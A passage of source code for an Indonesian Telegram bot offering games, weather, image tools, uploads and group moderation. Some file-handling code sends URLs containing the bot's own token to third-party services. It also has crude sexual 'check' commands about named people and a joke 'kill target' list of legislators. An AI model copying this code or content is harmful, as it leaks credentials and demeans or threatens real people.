    ctx.reply('<blockquote>❌ Terjadi kesalahan saat memproses permintaan.</blockquote>', { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : cekkontol ] -------------------- \\\
bot.command('cekkontol', async (ctx) => {
  const text = ctx.message.text.split(' ').slice(1).join(' ').trim();
  if (!(await checkUserLimit(ctx, 'cekkontol'))) return;
  
  if (!text) return ctx.reply('<blockquote>❌ Example : /cekkontol Bapak Komintod</blockquote>', { parse_mode: 'HTML' });
  
  const penisStatus = ['Putih mulus', 'Putih', 'Hitam'];
  const pubicStatus = ['Lebat', 'Tipis', 'Tidak ada', 'Bersih'];
  const virginityStatus = ['Perjaka', 'Tidak perjaka', 'Besar', 'Panjang', 'Disunat', 'Belum Disunat'];
  
  const replyText = `
<blockquote>╭━━━━°「 Hasil cek ${text} 」°
┊• Nama : ${text}
┃• Penis : ${pickRandom(penisStatus)}
┊• Pubic : ${pickRandom(pubicStatus)}
┃• Status : ${pickRandom(virginityStatus)}
╰═┅═━––––––๑</blockquote>`;
  
  ctx.reply(replyText, { parse_mode: 'HTML' });
});

/// -------------------- [ Command : cekkhodam ] -------------------- \\\
bot.command('cekkhodam', async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1).join(' ');
  if (!(await checkUserLimit(ctx, 'cekkhodam'))) return;
  
  if (!args) return await ctx.reply('<blockquote>❌ Silakan tulis nama setelah perintah.</blockquote>\n<blockquote>Contoh: /cekkhodam AldzyIsHere</blockquote>', { parse_mode: 'HTML' });
  
  const randomIndex = Math.floor(Math.random() * khodamList.length);
  const khodam = khodamList[randomIndex];
  
  await ctx.reply(`<blockquote>📅 Hari ini, khodam <b>${args}</b> adalah: <b>${khodam}</b></blockquote>`, { parse_mode: 'HTML' });
});

/// -------------------- [ Command : siapakah ] -------------------- \\\
bot.command('siapakah', async (ctx) => {
  const pertanyaan = ctx.message.text.split(' ').slice(1).join(' ');
  if (!(await checkUserLimit(ctx, 'siapakah'))) return;
  
  if (!pertanyaan) return ctx.reply('<blockquote>❌ Contoh: /siapakah yang paling ganteng</blockquote>', { parse_mode: 'HTML' });
  
  const nama = ['AldzyIsHere', 'Rizz', 'Faxzz', 'Zuan', 'Rindau', 'Nuxz', 'Orang solo itu', 'Jokowi', 'Prabowo', 'Ganjar pranowo'];
  const acak = nama[Math.floor(Math.random() * nama.length)];
  
  ctx.reply(`<blockquote>🔍 ${pertanyaan}? Jawabannya: <b>${acak}</b></blockquote>`, { parse_mode: 'HTML' });
});

/// -------------------- [ Command : hd ] -------------------- \\\
bot.command('hd', async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    let memek;
    
    if (reply && reply.photo) {
      const fileId = reply.photo[reply.photo.length - 1].file_id;
      const file = await ctx.telegram.getFile(fileId);
      memek = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
    } else {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if (!args) return ctx.reply('<blockquote>❌ Kirim URL gambar atau reply ke foto!</blockquote>', { parse_mode: 'HTML' });
      memek = args.trim();
    }
    
    const Mbuttt = `https://smail.my.id/enhance?url=${encodeURIComponent(memek)}`;
    
    await ctx.replyWithChatAction('upload_photo');
    await ctx.replyWithPhoto({ url: Mbuttt }, { 
      caption: '<blockquote>✅ Gambar berhasil hd</blockquote>', 
      parse_mode: 'HTML' 
    });
  } catch (err) {
    console.error(err);
    ctx.reply('<blockquote>❌ Gagal mengubah gambar ke hd</blockquote>', { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : tebakangka ] -------------------- \\\
bot.command("tebakangka", async (ctx) => {
  const userId = ctx.from.id;

  if (activeGames.has(userId))
    return ctx.reply("<blockquote>⚠️ Kamu masih main game lain! Ketik <b>/stop</b> untuk keluar.</blockquote>", { parse_mode: 'HTML' });

  const randomNumber = Math.floor(Math.random() * 10) + 1;

  const buttons = [];
  for (let i = 1; i <= 10; i += 5) {
    const row = [];
    for (let j = i; j < i + 5; j++) {
      row.push({ text: j.toString(), callback_data: `tebakangka_${j}` });
    }
    buttons.push(row);
  }

  const sent = await ctx.reply(
    "<blockquote>🎯 <b>Game Tebak Angka Dimulai!</b>\nPilih angka antara 1–10 di bawah ini!\n\n<b>Ketik /stop untuk keluar game.</b></blockquote>",
    {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: buttons },
    }
  );

  activeGames.set(userId, {
    type: "tebakangka",
    answer: randomNumber.toString(),
    messageId: sent.message_id,
    chatId: sent.chat.id,
    timeout: setTimeout(() => {
      activeGames.delete(userId);
      ctx.reply("<blockquote>⌛ Waktu habis! Game dibatalkan.</blockquote>", { parse_mode: 'HTML' });
    }, 60000),
  });
});

bot.action(/^tebakangka_(\d+)/, async (ctx) => {
  const userId = ctx.from.id;
  const chosen = parseInt(ctx.match[1]);
  const game = activeGames.get(userId);

  if (!game || game.type !== "tebakangka") {
    return ctx.answerCbQuery("❌ Game tidak aktif atau bukan tebakangka!");
  }

  clearTimeout(game.timeout);
  activeGames.delete(userId);

  if (chosen === parseInt(game.answer)) {
    addLimit(userId, 1500);
    const total = getLimit(userId);
    
    await ctx.editMessageText(
      `<blockquote>🎉 <b>Benar!</b>\nAngka yang benar adalah <b>${game.answer}.</b>\n🎁 Kamu dapat +1500 limit!\n💰 Total sekarang: <b>${total.toLocaleString()}</b> limit.</blockquote>`,
      { parse_mode: "HTML" }
    );
  } else {
    await ctx.editMessageText(
      `<blockquote>❌ 𝗦𝗔𝗟𝗔𝗛!!\nAngka yang benar adalah <b>${game.answer}.</b>\n<b>Coba lagi dengan /tebakangka!</b></blockquote>`,
      { parse_mode: 'HTML' }
    );
  }

  ctx.answerCbQuery();
});

/// -------------------- [ Command : asahotak ] -------------------- \\\
bot.command("asahotak", async (ctx) => {
  await startGame(
    ctx,
    "asahotak",
    "https://api.deline.web.id/game/asahotak",
    async (ctx, data) => {
      return await ctx.reply(
        `<blockquote>🧠 <b>Game Asah Otak!</b>\n📌 Pertanyaan: <b>${data.soal}</b>\n\n<b>Raply pesan ini dengan jawaban kamu.</b>\nKetik /stop untuk keluar game.</blockquote>`,
        { parse_mode: "HTML" }
      );
    }
  );
});

/// -------------------- [ Command : caklontong ] -------------------- \\\
bot.command("caklontong", async (ctx) => {
  await startGame(
    ctx,
    "caklontong",
    "https://api.deline.web.id/game/caklontong",
    async (ctx, data) => {
      return await ctx.reply(
        `<blockquote>🧠 <b>Game Cak Lontong!</b>\n📌 Pertanyaan: <b>${data.soal}</b>\n\n<b>Raply pesan ini dengan jawaban kamu.</b>\nKetik /stop untuk keluar game.</blockquote>`,
        { parse_mode: "HTML" }
      );
    }
  );
});

/// -------------------- [ Command : susunkata ] -------------------- \\\
bot.command("susunkata", async (ctx) => {
  await startGame(
    ctx,
    "susunkata",
    "https://api.deline.web.id/game/susunkata",
    async (ctx, data) => {
      return await ctx.reply(
        `<blockquote>🧠 <b>Game Susunkata!</b>\n📌 Pertanyaan: <b>${data.soal}</b>\nTipe: <b>${data.tipe}</b>\n\n<b>Raply pesan ini dengan jawaban kamu.</b>\nKetik /stop untuk keluar game.</blockquote>`,
        { parse_mode: "HTML" }
      );
    }
  );
});

/// -------------------- [ Command : family100 ] -------------------- \\\
bot.command("family100", async (ctx) => {
  await startGame(
    ctx,
    "family100",
    "https://api.deline.web.id/game/family100",
    async (ctx, data) => {
      return await ctx.reply(
        `<blockquote>🧠 <b>Game Family100!</b>\n📌 Pertanyaan: <b>${data.soal}</b>\n\n<b>Raply pesan ini dengan jawaban kamu.</b>\nKetik /stop untuk keluar game.</blockquote>`,
        { parse_mode: "HTML" }
      );
    }
  );
});

/// -------------------- [ Command : tebakheroml ] -------------------- \\\
bot.command("tebakheroml", async (ctx) => {
  await startGame(
    ctx,
    "tebakheroml",
    "https://api.deline.web.id/game/tebakheroml",
    async (ctx, data) => {
      return await ctx.replyWithPhoto(
        { url: data.img },
        {
          caption: `<blockquote>🎮 <b>Tebak Hero Mobile Legends!</b>\nTebak hero apakah ini?\n\n<b>Raply pesan ini dengan jawaban kamu.</b>\nKetik /stop untuk keluar game.</blockquote>`,
          parse_mode: "HTML"
        }
      );
    }
  );
});

/// -------------------- [ Command : tebakkata ] -------------------- \\\
bot.command("tebakkata", async (ctx) => {
  await startGame(
    ctx,
    "tebakkata",
    "https://api.deline.web.id/game/tebakkata",
    async (ctx, data) => {
      return await ctx.reply(
        `<blockquote>🧠 <b>Game Tebak Kata!</b>\n📌 Clue: <b>${data.soal}</b>\n\n<b>Raply pesan ini dengan jawaban kamu.</b>\nKetik /stop untuk keluar game.</blockquote>`,
        { parse_mode: "HTML" }
      );
    }
  );
});

/// -------------------- [ Command : tebakpemainbola ] -------------------- \\\
bot.command("tebakpemainbola", async (ctx) => {
  await startGame(
    ctx,
    "tebakpemainbola",
    "https://api.deline.web.id/game/tebakpemainbola",
    async (ctx, data) => {
      return await ctx.reply(
        `<blockquote>⚽ <b>Game Tebak Pemain Bola!</b>\n📌 Clue: <b>${data.soal}</b>\n\n<b>Raply pesan ini dengan jawaban kamu.</b>\nKetik /stop untuk keluar game.</blockquote>`,
        { parse_mode: "HTML" }
      );
    }
  );
});

/// -------------------- [ Command : tekateki ] -------------------- \\\
bot.command("tekateki", async (ctx) => {
  await startGame(
    ctx,
    "tekateki",
    "https://api.deline.web.id/game/tekateki",
    async (ctx, data) => {
      return ctx.reply(
        `<blockquote>🧩 <b>Teka-Teki!</b>\n\n❓ Pertanyaan: <b>${data.soal}</b>\n\n<b>Raply pesan ini dengan jawaban kamu.</b>\nKetik /stop untuk keluar game.<blockquote>`,
        { parse_mode: "HTML" }
      );
    }
  );
});

bot.on("text", async (ctx, next) => {
  const userId = ctx.from.id;
  const text = ctx.message.text.trim().toLowerCase();
  const replyTo = ctx.message.reply_to_message?.message_id;
  
  if (activeGames.has(userId)) {
    const game = activeGames.get(userId);

    // Keluar game
    if (text === "/stop") {
      clearTimeout(game.timeout);
      activeGames.delete(userId);
      return ctx.reply("<blockquote>🚪 Kamu keluar dari game.</blockquote>", { parse_mode: 'HTML' });
    }

    if (replyTo !== game.questionId) return;
    
    if (text === game.answer.toLowerCase()) {
      clearTimeout(game.timeout);
      activeGames.delete(userId);

      addLimit(userId, 1500);
      const total = getLimit(userId);

      const extraDesc = game.desc ? `\n<blockquote>📝 ${game.desc}</blockquote>` : "";

      return ctx.reply(
        `<blockquote>🎉 <b>Benar!</b></blockquote>\n<blockquote>Jawaban: ${game.answer.toUpperCase()}\n🎁 Kamu dapat +1500 limit!\n💰 Total sekarang: ${total.toLocaleString()} limit.</blockquote>` +
        `${extraDesc}`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "Kembali", callback_data: "back_to_menu" }]
            ]
          }
        }
      );
    }

    // ini kalo salah anjj
    return ctx.reply("<blockquote>❌ Salah! Coba lagi, balas pesan pertanyaan.</blockquote>", { parse_mode: 'HTML' });
  }

  // Lanjut aja dah ah maless
  return next();
});

// -----------------------------------------------------------------
// [ ACTION HANDLERS ]
// -----------------------------------------------------------------

/// -------------------- [ Action: Cuaca Province Page ] -------------------- \\\
bot.action(/^cuaca_prov_page\|(\d+)/, async (ctx) => {
  const page = parseInt(ctx.match[1]);
  await ctx.answerCbQuery();
  sendProvincePage(ctx, page);
});

/// -------------------- [ Action: Cuaca City Page ] -------------------- \\\
bot.action(/^cuaca_prov\|(.+?)\|(\d+)/, async (ctx) => {
  const prov = ctx.match[1];
  const page = parseInt(ctx.match[2]);
  await ctx.answerCbQuery();
  sendCityPage(ctx, prov, page);
});

/// -------------------- [ Action: Cuaca City Detail ] -------------------- \\\
bot.action(/^cuaca_city\|(.+)/, async (ctx) => {
  const city = ctx.match[1];
  await ctx.answerCbQuery("⏳ Mengambil data cuaca...");

  try {
    const res = await axios.get(
      `https://api-ikyzxc.vercel.app/Info/cuaca`,
      { params: { apikey: "kyzz", query: city } }
    );

    const r = res.data.result;
    ctx.editMessageText(
      `<blockquote>🌦️ Cuaca ${r.lokasi}</blockquote>\n<blockquote>🕒 ${r.waktu}\n🌤️ Kondisi: ${r.kondisi}\n🌡️ Suhu: ${r.suhu}\n💧 Kelembapan: ${r.kelembapan}\n💨 Angin: ${r.angin}</blockquote>`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    ctx.editMessageText("<blockquote>❌ Gagal mengambil data cuaca.</blockquote>", { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Action: Cuaca Back to Province ] -------------------- \\\
bot.action("cuaca_back_prov", async (ctx) => {
  await ctx.answerCbQuery();
  sendProvincePage(ctx, 0);
});

/// -------------------- [ Action: TikTok Download Audio ] -------------------- \\\
bot.action(/ttdl_(.+)/, async (ctx) => {
  const url = ctx.match[1];
  await ctx.answerCbQuery("Mengirim audio...");

  try {
    await ctx.replyWithAudio({ url });
  } catch (e) {
    ctx.reply("<blockquote>❌ Gagal mengirim audio.</blockquote>", { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Action: Quote Creator ] -------------------- \\\
bot.action(/^qc_(black|white)\|(.+)/, async (ctx) => {
  await ctx.answerCbQuery('⏳ Membuat quote...');
  
  const mode = ctx.match[1];
  const text = decodeURIComponent(ctx.match[2]);
  const bgColor = mode === 'black' ? '#000000' : '#ffffff';
  
  let ppuser;
  try {
    const photos = await ctx.telegram.getUserProfilePhotos(ctx.from.id, 1);
    if (photos.total_count > 0) {
      const file = await ctx.telegram.getFile(photos.photos[0][0].file_id);
      const filePath = encodeURIComponent(file.file_path);
      ppuser = `https://api.telegram.org/file/bot${ctx.telegram.token}/${filePath}`;
    } else {
      ppuser = null;
    }
  } catch {
    ppuser = null;
  }
  
  const json = {
    type: 'quote',
    format: 'png',
    backgroundColor: bgColor,
    width: 812,
    height: 968,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: ctx.from.first_name,
          photo: { url: ppuser || 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg' },
        },
        text,
        replyMessage: {},
      },
    ],
  };
  
  try {
    const res = await axios.post('https://bot.lyo.su/quote/generate', json, { headers: { 'Content-Type': 'application/json' } });
    const buffer = Buffer.from(res.data.result.image, 'base64');
    await ctx.replyWithSticker({ source: buffer });
  } catch (err) {
    console.error(err);
    ctx.reply('<blockquote>❌ Gagal membuat qc.</blockquote>', { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Action: Ewe Retry ] -------------------- \\\
bot.action(/^ewe_retry_(.+)_(.+)/, async (ctx) => {
  try {
    const userId = ctx.match[1];
    const tag = decodeURIComponent(ctx.match[2]);
    
    if (ctx.from.id.toString() !== userId) {
      await ctx.answerCbQuery('❌ Ini bukan untukmu!');
      return;
    }
    
    const penalty = 7000;
    const userLimit = getUserLimit(userId);
    
    if (userLimit.remaining < penalty) {
      await ctx.answerCbQuery(`❌ LIMIT tidak cukup! Butuh ${formatNumber(penalty)} limit`);
      return;
    }
    
    deductUserLimit(userId, penalty);
    await ctx.answerCbQuery('⏳ Mencoba lagi...');
    
    await ctx.editMessageText(
      `<blockquote>🔄 <b>Mencoba lagi...</b></blockquote>\n<blockquote>💸 Biaya: -${formatNumber(penalty)} LIMIT\n📊 Sisa Limit: ${formatNumber(getUserLimit(userId).remaining)}</blockquote>`,
      { parse_mode: 'HTML' }
    );
    
    await sleep(1500);
    
    const success = Math.random() < 0.6;
    const reward = 15000;
    
    if (success) {
      addUserLimit(userId, reward * 2);
      const newLimit = getUserLimit(userId);
      
      await ctx.editMessageText(
        `<blockquote>🎉 <b>Berhasil pada percobaan kedua!</b></blockquote>\n\n<blockquote>🎯 Kamu berhasil ${tag}\n💰 Mendapatkan: +${formatNumber(reward * 2)} LIMIT! 🎉\n📊 Total Limit: ${formatNumber(newLimit.remaining)}/${formatNumber(newLimit.dailyLimit)}</blockquote>`,
        { parse_mode: 'HTML' }
      );
    } else {
      const newLimit = getUserLimit(userId);
      
      await ctx.editMessageText(
        `<blockquote>😭 <b>Gagal lagi!</b></blockquote>\n\n<blockquote>🎯 Kamu gagal lagi dengan ${tag}\n💸 Sudah kehilangan: ${formatNumber(penalty)} LIMIT\n📊 Sisa Limit: ${formatNumber(newLimit.remaining)}/${formatNumber(newLimit.dailyLimit)}\n\n💡 Coba lagi nanti atau upgrade limit!</blockquote>`,
        { parse_mode: 'HTML' }
      );
    }
  } catch (error) {
    console.error(chalk.red(`❌ /ewe retry error: ${error.message}`));
    await ctx.answerCbQuery('❌ Error!');
  }
});

/// -------------------- [ Action: Tebus Penjara ] -------------------- \\\
bot.action(/^tebus_(.+)/, async (ctx) => {
  const userId = ctx.match[1];
  
  if (ctx.from.id.toString() !== userId) {
    await ctx.answerCbQuery('❌ Ini bukan untukmu!');
    return;
  }
  
  const currentLimit = getCurrentLimit(userId);
  if (currentLimit < 100000) {
    await ctx.answerCbQuery('❌ LIMIT tidak cukup!');
    return;
  }
  
  deductFromLimit(userId, 100000);
  delete jail[userId];
  const newLimit = getCurrentLimit(userId);
  
  await ctx.answerCbQuery('✅ Berhasil ditebus!');
  await ctx.editMessageText(`<blockquote>🎉 Kamu berhasil menebus kebebasan!</blockquote>\n<blockquote>📉 LIMIT berkurang: 100,000\n\nSekarang kamu bebas!\n\nTotal Limit: ${newLimit.toLocaleString()}</blockquote>`, { parse_mode: 'HTML' });
});

/// -------------------- [ Action: Lihat Daftar Target Bunuh ] -------------------- \\\
bot.action('lihat_kontol', async (ctx) => {
  let list = '<blockquote>📜 <b>Daftar Tikus Kantor (Target Bunuh):</b></blockquote>\n\n';
  
  DprNgentod.forEach((nama, i) => {
    list += `<blockquote>${i + 1}. ${nama}</blockquote>\n`;
  });
  
  list += `<blockquote>\nGunakan: /bunuh [nama]\nContoh: /bunuh Sahroni</blockquote>`;
  
  await ctx.answerCbQuery();
  await ctx.reply(list, { parse_mode: 'HTML' });
});

/// -------------------- [ Action: To URL Uploader ] -------------------- \\\
bot.on('callback_query', async (ctx) => {
  const data = ctx.callbackQuery.data;
  if (!data.startsWith('tourl_')) return;
  
  const [, host, key] = data.split('_');
  const mem = memory[key];
  
  if (!mem) return ctx.answerCbQuery('❌ Data expired');
  
  if (host === 'cancel') {
    delete memory[key];
    return ctx.editMessageText('<blockquote>❌ Upload dibatalkan.</blockquote>', { parse_mode: 'HTML' });
  }
  
  await ctx.editMessageText('<blockquote>⏳ Uploading...</blockquote>', { parse_mode: 'HTML' });
  
  try {
    const fileLink = await ctx.telegram.getFileLink(mem.file_id);
    const stream = await axios.get(fileLink.href, { responseType: 'stream' });
    
    let url;
    
    if (host === 'kyzz') {
      const form = new FormData();
      form.append('file', stream.data, { filename: mem.file_name });
      
      const res = await axios.post('https://kyzzuploader.my.id/api/upload', form, {
        headers: form.getHeaders(),
        maxBodyLength: Infinity,
        maxContentLength: Infinity,
      });
      
      if (!res.data.success) throw new Error(res.data.error || 'Upload gagal');
      url = res.data.file.url;
    }
    
    if (host === 'catbox') {
      const form = new FormData();
      form.append('reqtype', 'fileupload');
      form.append('fileToUpload', stream.data, { filename: mem.file_name });
      
      const res = await axios.post('https://catbox.moe/user/api.php', form, { headers: form.getHeaders() });
      url = res.data;
    }
    
    delete memory[key];
    
    await ctx.editMessageText(`<blockquote>✅ <b>Upload Berhasil</b></blockquote>\n<blockquote>🔗 <code>${url}</code></blockquote>`, { parse_mode: 'HTML' });
  } catch (e) {
    delete memory[key];
    await ctx.editMessageText(`<blockquote>❌ Upload gagal</blockquote>\n<blockquote>${e.response?.data?.error || e.message}</blockquote>`, { parse_mode: 'HTML' });
  }
});

// ---------- [ MESSAGE HANDLER ] ----------
bot.on("text", async (ctx, next) => {
    const userId = ctx.from.id;
    const text = ctx.message.text.trim().toLowerCase();
    const replyTo = ctx.message.reply_to_message?.message_id;
    
    if (filterStep[userId] === "waiting_trigger") {
        tempTrigger[userId] = ctx.message.text.toLowerCase();
        filterStep[userId] = "waiting_response";
        return ctx.reply("<blockquote>📎 Sekarang kirim <b>pesan / foto / video / file</b> untuk balasan filter</blockquote>", { parse_mode: "HTML" });
    }

    if (filterStep[userId] === "waiting_response") {
        const trigger = tempTrigger[userId];
        if (!trigger) { 
            delete filterStep[userId]; 
            return ctx.reply("<blockquote>❌ Terjadi kesalahan. Ulangi proses filter.</blockquote>", { parse_mode: "HTML" }); 
        }
        
        let response = null;
        if (ctx.message.text) response = { type: "text", text: ctx.message.text };
        else if (ctx.message.photo) response = { type: "photo", file_id: ctx.message.photo[ctx.message.photo.length - 1].file_id, caption: ctx.message.caption || "" };
        else if (ctx.message.video) response = { type: "video", file_id: ctx.message.video.file_id, caption: ctx.message.caption || "" };
        else if (ctx.message.document) response = { type: "document", file_id: ctx.message.document.file_id, caption: ctx.message.caption || "" };
        else return ctx.reply("<blockquote>❌ Tipe pesan tidak didukung</blockquote>", { parse_mode: "HTML" });
        
        const data = loadFilter();
        if (!data[ctx.chat.id]) data[ctx.chat.id] = {};
        data[ctx.chat.id][trigger] = response;
        saveFilter(data);
        
        delete filterStep[userId];
        delete tempTrigger[userId];
        
        // button
        const keyboard = [
          [Markup.button.callback("🗑 Hapus Filter", `show_delete_${trigger}`)],
          [Markup.button.callback("❌ Tutup", "close_message")]
        ];
        
        return ctx.reply(
          `<blockquote>✅ <b>Filter berhasil ditambahkan!</b>\n\nTrigger: <code>${trigger}</code>\n\n📌 Gunakan /dellfilter untuk melihat daftar filter.</blockquote>`,
          { 
            parse_mode: "HTML", 
            reply_markup: { inline_keyboard: keyboard }
          }
        );
    }

    // Anti-link check
    if (ctx.chat.type !== "private" && antiLinkStatus[ctx.chat.id]) {
        if (ctx.from.id.toString() !== OWNER_ID) {
            const text = ctx.message.text || ctx.message.caption || "";
            const hasUrlEntity = (Array.isArray(ctx.message.entities) && ctx.message.entities.some(e => e.type === "url" || e.type === "text_link")) ||
                (Array.isArray(ctx.message.caption_entities) && ctx.message.caption_entities.some(e => e.type === "url" || e.type === "text_link"));
            const isLink = hasUrlEntity || (typeof text === "string" && linkRegex.test(text));
            if (isLink) {
                try {
                    const me = await ctx.telegram.getChatMember(ctx.chat.id, ctx.botInfo.id);
                    if (me.status === "administrator" && me.can_delete_messages) { 
                        try { await ctx.deleteMessage(ctx.message.message_id); } catch (e) { } 
                    }
                } catch (e) { }
                const name = ctx.from.username ? `@${ctx.from.username}` : (ctx.from.first_name || "Pengguna");
                return ctx.reply(`<blockquote>⚠️ ${name}\nDilarang mengirim link di grup ini!</blockquote>`, { parse_mode: "HTML" });
            }
        }
    }

    // Filter response
    if (ctx.message.text && !ctx.message.text.startsWith("/")) {
        const trigger = ctx.message.text.toLowerCase();
        const data = loadFilter();
        const filter = data[ctx.chat.id] ? data[ctx.chat.id][trigger] : null;
        if (filter) {
            if (filter.type === "text") return ctx.reply(filter.text);
            if (filter.type === "photo") return ctx.replyWithPhoto(filter.file_id, { caption: filter.caption || "" });
            if (filter.type === "video") return ctx.replyWithVideo(filter.file_id, { caption: filter.caption || "" });
            if (filter.type === "document") return ctx.replyWithDocument(filter.file_id, { caption: filter.caption || "" });
        }
    }

    // Game handling
    if (activeGames.has(userId)) {
        const game = activeGames.get(userId);
        if (text === "/stop") {
            clearTimeout(game.timeout);
            activeGames.delete(userId);
            return ctx.reply("<blockquote>🚪 Kamu keluar dari game.</blockquote>", { parse_mode: 'HTML' });
        }
        if (replyTo !== game.questionId) return;
        if (text === game.answer.toLowerCase()) {
            clearTimeout(game.timeout);
            activeGames.delete(userId);
            addLimit(userId, 1500);
            const total = getLimit(userId);
            const extraDesc = game.desc ? `\n<blockquote>📝 ${game.desc}</blockquote>` : "";
            return ctx.reply(
                `<blockquote>🎉 <b>Benar!</b></blockquote>\n<blockquote>Jawaban: ${game.answer.toUpperCase()}\n🎁 Kamu dapat +1500 limit!\n💰 Total sekarang: ${total.toLocaleString()} limit.</blockquote>${extraDesc}`, 
                { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "Kembali", callback_data: "back_to_menu" }]] } }
            );
        }
        return ctx.reply("<blockquote>❌ Salah! Coba lagi, balas pesan pertanyaan.</blockquote>", { parse_mode: 'HTML' });
    }

    // Chat owner feature
    if (Livechat.has(userId) && Livechat.get(userId).mode === 'sending_message') {
        await sendMessageToOwner(ctx, 'text', ctx.message.text);
        return;
    }

    if (isOwner(ctx.from.id) && ctx.message.reply_to_message) {
        await handleOwnerReply(ctx);
        return;
    }

    return next();
});

// --------------------------------------------------------------------------
// [ AUTO BACKUP INTERVAL ]
// --------------------------------------------------------------------------
setTimeout(() => { AutoBackup(); }, 30 * 60 * 1000);
const AUTO_BACKUP_INTERVAL = 30 * 60 * 1000;
setInterval(() => { AutoBackup(); }, AUTO_BACKUP_INTERVAL);

// --------------------------------------------------------------------------
// [ EXPIRED SESSION CLEANUP ]
// --------------------------------------------------------------------------
setInterval(() => {
    const now = Date.now();
    for (const [userId, session] of userSessions.entries()) if (now - session.timestamp > 24 * 60 * 60 * 1000) userSessions.delete(userId);
    for (const [msgId, data] of ForMessenger.entries()) if (now - data.timestamp > 7 * 24 * 60 * 60 * 1000) ForMessenger.delete(msgId);
}, 60 * 60 * 1000);


const colors = ['cyan', 'magenta', 'green', 'yellow', 'blue', 'red', 'white'];
// --------------------------------------------------------------------------
// [ START BOT FUNCTION ]
// --------------------------------------------------------------------------
async function startBot() {
    console.log(chalk.green(`
────── 🚀 BOT SUCCESSFULLY LAUNCHED ──────`));
    console.log(chalk.green(`
╭─ BOT INFORMATION 
├ Name Bot : Vyxxz! - BOT
├ Version : 1.0.0 Pro
├ Owner : @ReyValdz
╰────────────────────`));
    bot.launch().then(() => {
        console.log(chalk.green("✅ Bot Telegram berhasil diluncurkan!"));
    });
}

// --------------------------------------------------------------------------
// [ ERROR HANDLERS ]
// --------------------------------------------------------------------------
startBot().catch(error => {
    console.error(chalk.red("❌ Error starting bot:"), error);
    process.exit(1);
});

process.on("unhandledRejection", err => {
    console.log("Unhandled Rejection:", err);
});

process.on("uncaughtException", err => {
    console.log("Uncaught Exception:", err);
});
})();